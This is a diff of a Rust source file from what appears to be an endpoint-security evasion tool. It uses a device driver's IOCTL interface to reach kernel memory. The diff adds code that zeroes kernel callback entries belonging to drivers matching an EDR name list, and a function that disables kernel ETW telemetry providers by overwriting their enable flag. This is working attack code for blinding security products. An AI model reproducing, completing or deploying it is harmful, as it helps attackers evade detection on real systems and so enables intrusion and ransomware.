@@ -4,22 +4,16 @@ use std::ptr::null_mut;
 use std::ptr;
 
 use winapi::shared::ntdef::HANDLE;
-use windows::Win32::Foundation::{BOOL};
 use winapi::um::errhandlingapi::GetLastError;
 use winapi::um::fileapi::{CreateFileA, OPEN_EXISTING};
-use windows::Win32::System::Diagnostics::Debug::ReadProcessMemory;
-use windows::Win32::System::Threading::GetCurrentProcess;
 use winapi::um::handleapi::INVALID_HANDLE_VALUE;
-use winapi::shared::ntdef::{NTSTATUS};
 use winapi::um::winnt::{
     FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SHARE_WRITE, GENERIC_READ, GENERIC_WRITE,
 };
 use winapi::um::ioapiset::DeviceIoControl;
 
-use crate::mem;
+use crate::mem::{self, write_qword};
 use crate::km_utils;
-
-const STATUS_SUCCESS: NTSTATUS = 0;
 
 
 // Opens a handle to the device and returns it
@@ -43,7 +37,6 @@ pub fn get_driver_handle() -> Result<HANDLE, u32> {
             eprintln!("[-] Failed to open handle to device. Error code: {}", err);
             Err(err)
         } else {
-            println!("[+] Opened handle to device");
             Ok(h_device)
         }
     }
@@ -88,9 +81,9 @@ pub unsafe fn send_ioctl_to_driver(
     success
 }
 
-
-pub fn read_cb(base_address: u64, cb_type: &str) -> windows::core::Result<Vec<u64>> {
-    println!("[>] Enumerating callback: {}", cb_type);
+// Read & disable EDR callbacks
+pub fn nerf_cb(base_address: u64, cb_type: &str) -> windows::core::Result<Vec<u64>> {
+    println!("[>] Enumerating {} callback at: 0x{:16X}", cb_type, base_address);
 
     let result = Vec::with_capacity(0x40);
 
@@ -113,13 +106,43 @@ pub fn read_cb(base_address: u64, cb_type: &str) -> windows::core::Result<Vec<u6
                 }
             }
             println!(
-                "[|]    [0x{:16X}]: 0x{:16X} in {}",
+                "[|]   [0x{:16X}]: 0x{:16X} [{}]",
                 addr, func_addr, drv_name
             );
+            if km_utils::is_driver_name_matching_edr(&drv_name) {
+                println!(
+                    "[|]    [0x{:16X}]: Entry matches EDR ({}). Removing...",
+                    addr, drv_name
+                );
+                write_qword(addr, 0x00);
+            }
         }
     }
 
     Ok(result)
 }
 
+// Read & disable a km ETW provider
+pub fn nerf_etw_prov(
+    prov_addr: u64, prov_name: &str, guid_offset: u64, prov_offset: u64
+) -> windows::core::Result<u64> {
+    println!("[>] Checking ETW provider {} at: 0x{:16X}", prov_name, prov_addr);
+
+    let reg_entry = mem::read_qword(prov_addr)?;
+    let guid_entry = mem::read_qword(reg_entry + guid_offset)?;
+    let enable_info = mem::read_dword(guid_entry + prov_offset)?;
+
+    if enable_info == 0x1 {
+        println!("[*] Current {} provider enabled status: 0x{:x}. Disabling!", prov_name, enable_info);
+        mem::write_dword(guid_entry + prov_offset, 0x0);
+        let enable_info = mem::read_dword(guid_entry + prov_offset)?;
+        println!("[*] New {} provider enabled status: 0x{:x}", prov_name, enable_info); 
+    } else if enable_info == 0x0 {
+        println!("[+] {} provider already disabled (status: 0x{:x})!", prov_name, enable_info);
+    } else {
+        println!("[-] Error: {} provider is neither 0 or 1 (status: 0x{:x})", prov_name, enable_info);
+    }
+
+    Ok(enable_info as u64) // wrap the success in Ok()
+}
 
